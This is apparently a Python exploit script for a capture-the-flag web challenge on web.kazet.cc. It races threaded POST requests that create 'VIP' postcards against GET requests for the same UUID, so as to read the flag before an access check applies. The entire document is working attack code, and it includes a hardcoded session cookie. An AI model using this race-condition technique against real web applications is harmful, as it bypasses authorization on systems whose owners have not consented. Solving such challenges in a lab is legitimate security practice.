import requests
import threading
import uuid
import os

CREATE_URL = "https://web.kazet.cc:52025/create/"
POSTCARD_URL = "https://web.kazet.cc:52025/postcard/"
COOKIES = {"sessionid": "r8mb71p03225558tt1skkdgx3pavfgi8"}
data = {
    "title": "title",
    "message": "message",
    "card_type": "VIP",
}


def do_post():
    r = requests.post(CREATE_URL, data=data, cookies=COOKIES)


def do_get():
    r = requests.get(POSTCARD_URL + data["id"] + "/")
    if "FLAG" in r.text:
        print(r.text)
        os._exit(0)

for _ in range(100):
    data["id"] = str(uuid.uuid4())
    post_thread = threading.Thread(target=do_post)
    get_thread = threading.Thread(target=do_get)

    post_thread.start()
    get_thread.start()
    post_thread.join()
    get_thread.join()